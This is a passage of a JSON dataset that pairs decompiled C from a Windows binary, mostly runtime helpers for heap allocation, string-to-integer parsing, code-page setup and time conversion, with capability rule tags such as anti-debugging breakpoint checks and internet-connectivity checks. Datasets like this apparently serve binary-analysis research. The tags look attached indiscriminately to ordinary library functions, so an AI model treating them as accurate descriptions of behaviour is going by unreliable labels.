        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00419d60(uint lpMem, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint32_t arg_10h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x4419d8, 0x10);\n    arg_10h = *(unaff_EBP + 0xc);\n    if (arg_10h < 0xffffffe1) {\n        if (*0x450fc8 == 3) {\n            fcn.0041c713(4);\n            *(unaff_EBP + -4) = 0;\n            uVar2 = *(unaff_EBP + 8);\n            iVar1 = fcn.0041c7f7(uVar2);\n            *(unaff_EBP + -0x20) = iVar1;\n            if (((iVar1 != 0) && (*(unaff_EBP + -0x1c) = 0,  arg_10h <= *0x450fb4)) &&\n               (iVar1 = fcn.0041ccf7(iVar1, uVar2, arg_10h),  iVar1 != 0)) {\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00419dde();\n            if (*(unaff_EBP + -0x20) != 0) goto code_r0x00419e04;\n            if (arg_10h == 0) {\n                arg_10h = 1;\n            }\n            arg_10h = arg_10h + 0xf & 0xfffffff0;\n        }\n        else if (arg_10h == 0) {\n            arg_10h = 1;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x450fc4, 0x10, *(unaff_EBP + 8), arg_10h);\n        *(unaff_EBP + -0x1c) = uVar2;\n    }\ncode_r0x00419e04:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 526
    },
    "00419e0a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00419e0a(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x4419e8, 0x10);\n    if (*0x450fc8 == 3) {\n        fcn.0041c713(4);\n        *(unaff_EBP + -4) = 0;\n        iVar1 = *(unaff_EBP + 8);\n        iVar2 = fcn.0041c7f7(iVar1);\n        *(unaff_EBP + -0x20) = iVar2;\n        if (iVar2 != 0) {\n            *(unaff_EBP + -0x1c) = *(iVar1 + -4) + -9;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00419e77();\n        if (*(unaff_EBP + -0x20) != 0) goto code_r0x00419e6c;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapSize)(*0x450fc4, 0, *(unaff_EBP + 8));\ncode_r0x00419e6c:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 331
    },
    "00419e80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00419e80(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar1 = fcn.0041b5aa();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44db2c) {\n        iVar1 = fcn.00420610();\n    }\n    while( true ) {\n        if (*(iVar1 + 0x28) < 2) {\n            uVar2 = *(*(iVar1 + 0x48) + *param_1 * 2) & 8;\n        }\n        else {\n            uVar2 = fcn.004202ae(iVar1, *param_1, 8);\n        }\n        if (uVar2 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    uVar2 = *param_1;\n    puVar5 = param_1 + 1;\n    if ((uVar2 == 0x2d) || (uVar3 = uVar2,  uVar2 == 0x2b)) {\n        uVar3 = *puVar5;\n        puVar5 = param_1 + 2;\n    }\n    iVar1 = 0;\n    while( true ) {\n        if ((uVar3 < 0x30) || (0x39 < uVar3)) {\n            iVar4 = -1;\n        }\n        else {\n            iVar4 = uVar3 - 0x30;\n        }\n        if (iVar4 == -1) break;\n        iVar1 = iVar4 + iVar1 * 10;\n        uVar3 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    if (uVar2 == 0x2d) {\n        iVar1 = -iVar1;\n    }\n    return iVar1;\n}\n",
        "token_count": 440
    },
    "00419f60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_518h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00419f60(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    uint unaff_ESI;\n    uint *puVar9;\n    uint noname_8;\n    uint noname_9;\n    uint *noname_2;\n    uint noname_11;\n    uint *noname_4;\n    uint noname_13;\n    uint noname_14;\n    uint noname_15;\n    uint noname_8_00;\n    uint *noname_1;\n    uint noname_10;\n    uint noname_12;\n    uint noname_13_00;\n    uint noname_14_00;\n    uint noname_7;\n    uint *arg_8h;\n    uint var_518h;\n    uint in_stack_fffffae8;\n    uint in_stack_fffffaec;\n    uint in_stack_fffffaf0;\n    uint in_stack_fffffaf4;\n    uint in_stack_fffffaf8;\n    uint in_stack_fffffafc;\n    uint in_stack_fffffb00;\n    uint in_stack_fffffb04;\n    uint var_318h;\n    uint var_218h;\n    uint var_118h;\n    uint lpCPInfo;\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    arg_8h = &lpCPInfo;\n    noname_7 = *0x452104;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n    if (iVar2 == 1) {\n        uVar3 = 0;\n        do {\n            *(&var_118h + uVar3) = uVar3;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n        var_118h._0_1_ = 0x20;\n        if (var_12h != 0) {\n            puVar8 = &var_12h + 1;\n            do {\n                uVar3 = var_12h;\n                if (uVar3 <= *puVar8) {\n                    uVar6 = (*puVar8 - uVar3) + 1;\n                    puVar9 = &var_118h + uVar3;\n                    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                        *puVar9 = 0x20202020;\n                        puVar9 = puVar9 + 1;\n                    }\n                    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                        *puVar9 = 0x20;\n                        puVar9 = puVar9 + 1;\n                    }\n                }\n                var_12h._0_1_ = puVar8[1];\n                puVar8 = puVar8 + 2;\n            } while (var_12h != 0);\n        }\n        noname_14_00 = 0;\n        puVar9 = &var_518h;\n        noname_10 = 0x100;\n        noname_1 = &var_118h;\n        noname_8_00 = 1;\n        noname_12 = *0x452104;\n        noname_13_00 = *0x451fe4;\n        fcn.004211e4(1, noname_1, 0x100, puVar9, *0x452104, *0x451fe4, 0, noname_7, arg_8h, unaff_ESI, var_518h, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4);\n        noname_15 = 0;\n        noname_4 = &var_218h;\n        noname_13 = 0x100;\n        noname_11 = 0x100;\n        noname_2 = &var_118h;\n        noname_9 = 0x100;\n        noname_8 = *0x451fe4;\n        noname_14 = *0x452104;\n        fcn.00420e28(*0x451fe4, 0x100, noname_2, 0x100, noname_4, 0x100, *0x452104, 0, noname_8_00, noname_1, noname_10\n                     , puVar9, noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, var_518h, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4, in_stack_fffffaf8, \n                     in_stack_fffffafc, in_stack_fffffb00, in_stack_fffffb04);\n        fcn.00420e28(*0x451fe4, 0x200, &var_118h, 0x100, &var_318h, 0x100, *0x452104, 0, noname_8, noname_9, noname_2, \n                     noname_11, noname_4, noname_13, noname_14, noname_15, noname_8_00, noname_1, noname_10, puVar9, \n                     noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, var_518h);\n        uVar3 = 0;\n        do {\n            uVar1 = *(&var_518h + uVar3 * 2);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 2) != 0) {\n                    *(uVar3 + 0x452001) = *(uVar3 + 0x452001) | 0x20;\n                    uVar4 = *(&var_318h + uVar3);\n                    goto code_r0x0041a072;\n                }\n                *(uVar3 + 0x452120) = 0;\n            }\n            else {\n                *(uVar3 + 0x452001) = *(uVar3 + 0x452001) | 0x10;\n                uVar4 = *(&var_218h + uVar3);\ncode_r0x0041a072:\n                *(uVar3 + 0x452120) = uVar4;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    else {\n        uVar3 = 0;\n        do {\n            if ((uVar3 < 0x41) || (0x5a < uVar3)) {\n                if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                    *(uVar3 + 0x452001) = *(uVar3 + 0x452001) | 0x20;\n                    cVar5 = uVar3 + -0x20;\n                    goto code_r0x0041a0b5;\n                }\n                *(uVar3 + 0x452120) = 0;\n            }\n            else {\n                *(uVar3 + 0x452001) = *(uVar3 + 0x452001) | 0x10;\n                cVar5 = uVar3 + ' ';\ncode_r0x0041a0b5:\n                *(uVar3 + 0x452120) = cVar5;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 1821
    },
    "0041a15b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a15b(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint *puVar8;\n    uint32_t var_1ch;\n    uint32_t lpCPInfo;\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    if (arg_8h != 0) {\n        iVar5 = 0;\n        uVar3 = 0;\ncode_r0x0041a17d:\n        if (*(uVar3 + 0x44d288) != arg_8h) goto code_r0x0041a185;\n        puVar8 = 0x452000;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_1ch = 0;\n        *puVar8 = 0;\n        puVar6 = iVar5 * 0x30 + 0x44d298;\n        do {\n            uVar2 = *puVar6;\n            puVar7 = puVar6;\n            while ((uVar2 != 0 && (uVar1 = puVar7[1],  uVar1 != 0))) {\n                uVar3 = uVar2;\n                if (uVar3 <= uVar1) {\n                    uVar2 = *(var_1ch + 0x44d280);\n                    do {\n                        *(uVar3 + 0x452001) = *(uVar3 + 0x452001) | uVar2;\n                        uVar3 = uVar3 + 1;\n                    } while (uVar3 <= uVar1);\n                }\n                puVar7 = puVar7 + 2;\n                uVar2 = *puVar7;\n            }\n            var_1ch = var_1ch + 1;\n            puVar6 = puVar6 + 8;\n        } while (var_1ch < 4);\n        *0x452104 = arg_8h;\n        *0x451fec = 1;\n        *0x451fe4 = fcn.00419f08();\n        *0x452110 = *(extraout_ECX + 0x44d28c);\n        *0x452114 = *(extraout_ECX + 0x44d290);\n        *0x452118 = *(extraout_ECX + 0x44d294);\n        goto code_r0x0041a2d2;\n    }\ncode_r0x0041a2cd:\n    fcn.00419f37();\ncode_r0x0041a2d2:\n    fcn.00419f60();\ncode_r0x0041a2de:\n    fcn.004192ca();\n    return;\ncode_r0x0041a185:\n    uVar3 = uVar3 + 0x30;\n    iVar5 = iVar5 + 1;\n    if (0xef < uVar3) goto code_r0x0041a190;\n    goto code_r0x0041a17d;\ncode_r0x0041a190:\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_8h, &lpCPInfo);\n    if (iVar5 != 1) {\n        if (*0x4507c8 == 0) goto code_r0x0041a2de;\n        goto code_r0x0041a2cd;\n    }\n    puVar8 = 0x452000;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *0x452104 = arg_8h;\n    *0x451fe4 = 0;\n    if (lpCPInfo < 2) {\n        *0x451fec = 0;\n    }\n    else {\n        if (var_12h != '\\0') {\n            puVar6 = &var_12h + 1;\n            do {\n                uVar2 = *puVar6;\n                if (uVar2 == 0) break;\n                for (uVar3 = puVar6[-1]; uVar3 <= uVar2; uVar3 = uVar3 + 1) {\n                    *(uVar3 + 0x452001) = *(uVar3 + 0x452001) | 4;\n                }\n                puVar7 = puVar6 + 1;\n                puVar6 = puVar6 + 2;\n            } while (*puVar7 != 0);\n        }\n        uVar3 = 1;\n        do {\n            *(uVar3 + 0x452001) = *(uVar3 + 0x452001) | 8;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0xff);\n        *0x451fe4 = fcn.00419f08();\n        *0x451fec = extraout_ECX_00;\n    }\n    *0x452110 = 0;\n    *0x452114 = 0;\n    *0x452118 = 0;\n    goto code_r0x0041a2d2;\n}\n",
        "token_count": 1255
    },
    "0041a459": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041a459(uint8_t *arg_8h, uint8_t **arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint16_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    uint8_t *puVar8;\n    uint32_t var_4h;\n    \n    iVar3 = fcn.0041b5aa();\n    iVar3 = *(iVar3 + 100);\n    if (iVar3 != *0x44db2c) {\n        iVar3 = fcn.00420610();\n    }\n    var_4h = 0;\n    uVar7 = *arg_8h;\n    puVar2 = arg_8h;\n    while( true ) {\n        puVar8 = puVar2 + 1;\n        if (*(iVar3 + 0x28) < 2) {\n            uVar4 = *(*(iVar3 + 0x48) + uVar7 * 2) & 8;\n        }\n        else {\n            uVar4 = fcn.004202ae(iVar3, uVar7, 8);\n        }\n        if (uVar4 == 0) break;\n        uVar7 = *puVar8;\n        puVar2 = puVar8;\n    }\n    if (uVar7 == 0x2d) {\n        arg_14h = arg_14h | 2;\ncode_r0x0041a4c0:\n        uVar7 = *puVar8;\n        puVar8 = puVar2 + 2;\n    }\n    else if (uVar7 == 0x2b) goto code_r0x0041a4c0;\n    if (((arg_10h < 0) || (arg_10h == 1)) || (0x24 < arg_10h)) {\n        if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n        return 0;\n    }\n    if (arg_10h == 0) {\n        if (uVar7 != 0x30) {\n            arg_10h = 10;\n            goto code_r0x0041a523;\n        }\n        if ((*puVar8 != 0x78) && (*puVar8 != 0x58)) {\n            arg_10h = 8;\n            goto code_r0x0041a523;\n        }\n        arg_10h = 0x10;\n    }\n    if (((arg_10h == 0x10) && (uVar7 == 0x30)) && ((*puVar8 == 0x78 || (*puVar8 == 0x58)))) {\n        uVar7 = puVar8[1];\n        puVar8 = puVar8 + 2;\n    }\ncode_r0x0041a523:\n    uVar4 = 0xffffffff / arg_10h;\n    do {\n        uVar1 = *(*0x44dcc0 + uVar7 * 2);\n        if ((uVar1 & 4) == 0) {\n            if ((uVar1 & 0x103) == 0) {\ncode_r0x0041a58f:\n                puVar8 = puVar8 + -1;\n                if ((arg_14h & 8) == 0) {\n                    if (arg_ch != NULL) {\n                        puVar8 = arg_8h;\n                    }\n                    var_4h = 0;\n                }\n                else if (((arg_14h & 4) != 0) ||\n                        (((arg_14h & 1) == 0 &&\n                         ((((arg_14h & 2) != 0 && (0x80000000 < var_4h)) ||\n                          (((arg_14h & 2) == 0 && (0x7fffffff < var_4h)))))))) {\n                    puVar5 = fcn.0041a92a();\n                    *puVar5 = 0x22;\n                    if ((arg_14h & 1) == 0) {\n                        var_4h = ((arg_14h & 2) != 0) + 0x7fffffff;\n                    }\n                    else {\n                        var_4h = 0xffffffff;\n                    }\n                }\n                if (arg_ch != NULL) {\n                    *arg_ch = puVar8;\n                }\n                if ((arg_14h & 2) == 0) {\n                    return var_4h;\n                }\n                return -var_4h;\n            }\n            if ((uVar7 < 'a') || ('z' < uVar7)) {\n                iVar3 = uVar7;\n            }\n            else {\n                iVar3 = uVar7 + -0x20;\n            }\n            uVar6 = iVar3 - 0x37;\n        }\n        else {\n            uVar6 = uVar7 - 0x30;\n        }\n        if (arg_10h <= uVar6) goto code_r0x0041a58f;\n        if ((var_4h < uVar4) || ((var_4h == uVar4 && (uVar6 <= 0xffffffff % arg_10h)))) {\n            var_4h = var_4h * arg_10h + uVar6;\n            arg_14h = arg_14h | 8;\n        }\n        else {\n            arg_14h = arg_14h | 0xc;\n        }\n        uVar7 = *puVar8;\n        puVar8 = puVar8 + 1;\n    } while( true );\n}\n",
        "token_count": 1253
    },
    "0041a646": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0041a646(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint32_t var_4h;\n    \n    uVar1 = arg_8h;\n    if (arg_8h < 0x100) {\n        uVar3 = fcn.004214e0(arg_8h);\n    }\n    else {\n        var_4h = 0;\n        iVar2 = fcn.0041b5aa();\n        iVar2 = *(iVar2 + 0x60);\n        if (iVar2 != *0x451fe8) {\n            iVar2 = fcn.0041a0ec();\n        }\n        arg_8h = CONCAT13(uVar1, CONCAT12(uVar1 >> 8, arg_8h));\n        if ((((*(iVar2 + 8) != 0) &&\n             (iVar2 = fcn.004211e4(1, &arg_8h + 2, 2, &var_4h, *(iVar2 + 4), *(iVar2 + 0xc), 1, unaff_EBX, var_4h, \n                                   unaff_EBP, unaff_retaddr, arg_8h, in_stack_00000008, in_stack_0000000c, \n                                   in_stack_00000010),  iVar2 != 0)) && (var_4h._2_2_ == 0)) && ((var_4h & 4) != 0)) {\n            return 1;\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 430
    },
    "0041a6ca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0041a6ca(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint32_t var_4h;\n    \n    uVar1 = arg_8h;\n    if (arg_8h < 0x100) {\n        uVar3 = fcn.00421559(arg_8h);\n    }\n    else {\n        var_4h = 0;\n        iVar2 = fcn.0041b5aa();\n        iVar2 = *(iVar2 + 0x60);\n        if (iVar2 != *0x451fe8) {\n            iVar2 = fcn.0041a0ec();\n        }\n        arg_8h = CONCAT13(uVar1, CONCAT12(uVar1 >> 8, arg_8h));\n        if ((((*(iVar2 + 8) != 0) &&\n             (iVar2 = fcn.004211e4(1, &arg_8h + 2, 2, &var_4h, *(iVar2 + 4), *(iVar2 + 0xc), 1, unaff_EBX, var_4h, \n                                   unaff_EBP, unaff_retaddr, arg_8h, in_stack_00000008, in_stack_0000000c, \n                                   in_stack_00000010),  iVar2 != 0)) && (var_4h._2_2_ == 0)) && ((var_4h & 8) != 0)) {\n            return 1;\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 430
    },
    "0041a74e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041a74e(char *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint64_t uVar1;\n    char *pcVar2;\n    uint32_t in_EAX;\n    char *pcVar3;\n    char cVar4;\n    \n    pcVar2 = param_1;\n    if (param_3 != 0) {\n        *param_1 = '-';\n        param_1 = param_1 + 1;\n        in_EAX = -in_EAX;\n        pcVar2 = param_1;\n    }\n    do {\n        pcVar3 = pcVar2;\n        uVar1 = in_EAX;\n        in_EAX = in_EAX / param_2;\n        cVar4 = uVar1 % param_2;\n        if (uVar1 % param_2 < 10) {\n            cVar4 = cVar4 + '0';\n        }\n        else {\n            cVar4 = cVar4 + 'W';\n        }\n        *pcVar3 = cVar4;\n        pcVar2 = pcVar3 + 1;\n    } while (in_EAX != 0);\n    pcVar3[1] = '\\0';\n    do {\n        cVar4 = *pcVar3;\n        *pcVar3 = *param_1;\n        pcVar3 = pcVar3 + -1;\n        *param_1 = cVar4;\n        param_1 = param_1 + 1;\n    } while (param_1 < pcVar3);\n    return;\n}\n",
        "token_count": 342
    },
    "0041a9af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0041a9af(int32_t arg_8h)\n\n{\n    uint64_t uVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    bool bVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = in_EAX[5];\n    var_8h = var_ch >> 0x1f;\n    if ((var_8h < 0) ||\n       ((((-1 < var_ch || var_8h < 0 && (var_ch < 0x45)) || (0 < var_8h)) || ((-1 < var_8h && (0x44c < var_ch)))))) {\ncode_r0x0041abf5:\n        _var_ch = -1;\n    }\n    else {\n        iVar4 = in_EAX[4];\n        if ((iVar4 < 0) || (0xb < iVar4)) {\n            uVar2 = iVar4 / 0xc;\n            iVar4 = iVar4 % 0xc;\n            bVar6 = CARRY4(var_ch, uVar2);\n            var_ch = var_ch + uVar2;\n            in_EAX[4] = iVar4;\n            var_8h = var_8h + (uVar2 >> 0x1f) + bVar6;\n            if (iVar4 < 0) {\n                bVar6 = var_ch != 0;\n                var_ch = var_ch - 1;\n                in_EAX[4] = iVar4 + 0xc;\n                var_8h = var_8h + -1 + bVar6;\n            }\n            if ((((var_8h < 0) || ((var_8h < 1 && (var_ch < 0x45)))) || (0 < var_8h)) ||\n               ((-1 < var_8h && (0x44c < var_ch)))) goto code_r0x0041abf5;\n        }\n        iVar4 = in_EAX[4];\n        var_14h = *(iVar4 * 4 + 0x44dd04);\n        var_10h = var_14h >> 0x1f;\n        iVar7 = fcn.0041ddb0(var_ch, var_8h, 4, 0);\n        if ((iVar7 == 0) && (uVar2 = var_ch,  iVar7 = fcn.0041ddb0(var_ch, var_8h, 100, 0),  iVar7 != 0)) {\ncode_r0x0041aaa4:\n            if (1 < iVar4) {\n                bVar6 = 0xfffffffe < var_14h;\n                var_14h = var_14h + 1;\n                var_10h = var_10h + bVar6;\n            }\n        }\n        else {\n            uVar2 = var_ch + 0x76c;\n            iVar7 = fcn.0041ddb0();\n            if (iVar7 == 0) goto code_r0x0041aaa4;\n        }\n        iVar5 = var_ch - 1;\n        iVar4 = var_8h - (var_ch == 0);\n        iVar7 = fcn.0041a880(var_ch + 299, var_8h + (0xfffffed4 < var_ch), 400, 0, uVar2);\n        uVar2 = iVar7 + in_EAX[3];\n        var_4h = iVar7 + in_EAX[3] >> 0x20;\n        uVar8 = fcn.0041a880(iVar5, iVar4, 100, 0);\n        var_4h = (var_4h - (uVar8 >> 0x20)) - (uVar2 < uVar8);\n        iVar7 = fcn.0041a880(iVar5, iVar4, 4, 0);\n        uVar1 = iVar7 + CONCAT44(var_4h, uVar2 - uVar8);\n        var_4h = uVar1 >> 0x20;\n        iVar7 = fcn.0041a840(var_ch, var_8h, 0x16d, 0);\n        iVar7 = iVar7 + (uVar1 & 0xffffffff | var_4h << 0x20) + CONCAT44(var_10h, var_14h);\n        uVar2 = iVar7;\n        var_4h = uVar2 - 0x63df;\n        iVar7 = fcn.0041a840(var_4h, (iVar7 >> 0x20) - (uVar2 < 0x63df), 0x18, 0);\n        iVar7 = fcn.0041a840(iVar7 + in_EAX[2], 0x3c, 0);\n        _var_ch = fcn.0041a840(iVar7 + in_EAX[1], 0x3c, 0);\n        _var_ch = _var_ch + *in_EAX;\n        if (arg_8h == 0) {\n            piVar3 = fcn.0041db87(&var_ch);\ncode_r0x0041abe1:\n            if (piVar3 == NULL) goto code_r0x0041abf5;\n        }\n        else {\n            fcn.0041dafd();\n            _var_ch = _var_ch + *0x44d8b0;\n            piVar3 = fcn.00418bd9(&var_ch);\n            if (piVar3 == NULL) goto code_r0x0041abf5;\n            if ((0 < in_EAX[8]) || ((in_EAX[8] < 0 && (0 < piVar3[8])))) {\n                _var_ch = _var_ch + *0x44d8b8;\n                piVar3 = fcn.00418bd9(&var_ch);\n                goto code_r0x0041abe1;\n            }\n        }\n        for (iVar4 = 9; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *in_EAX = *piVar3;\n            piVar3 = piVar3 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    return _var_ch;\n}\n",
        "token_count": 1466
    },
    "0041ac0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041ac0c(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x441a18, 0x10);\n    uVar2 = *(unaff_EBP + 8) * *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x20) = uVar2;\n    if (uVar2 == 0) {\n        uVar2 = 1;\n    }\n    do {\n        iVar3 = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        if (uVar2 < 0xffffffe1) {\n            if (*0x450fc8 == 3) {\n                uVar2 = uVar2 + 0xf & 0xfffffff0;\n                *(unaff_EBP + 0xc) = uVar2;\n                arg_8h_00 = *(unaff_EBP + -0x20);\n                if (*0x450fb4 < arg_8h_00) goto code_r0x0041ac81;\n                fcn.0041c713(4);\n                *(unaff_EBP + -4) = 0;\n                uVar1 = fcn.0041cfd6(arg_8h_00);\n                *(unaff_EBP + -0x1c) = uVar1;\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.0041acb6();\n                iVar3 = *(unaff_EBP + -0x1c);\n                if (iVar3 != 0) {\n                    fcn.004192e0(iVar3, 0, *(unaff_EBP + -0x20));\n                    goto code_r0x0041ac81;\n                }\n            }\n            else {\ncode_r0x0041ac81:\n                if (iVar3 != 0) {\ncode_r0x0041acc1:\n                    fcn.00419d4f();\n                    return;\n                }\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x450fc4, 8, uVar2);\n        }\n        if (((iVar3 != 0) || (*0x450944 == 0)) || (iVar3 = fcn.0041d2d2(uVar2),  iVar3 == 0)) goto code_r0x0041acc1;\n    } while( true );\n}\n",
        "token_count": 613
    },
    "0041acc7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
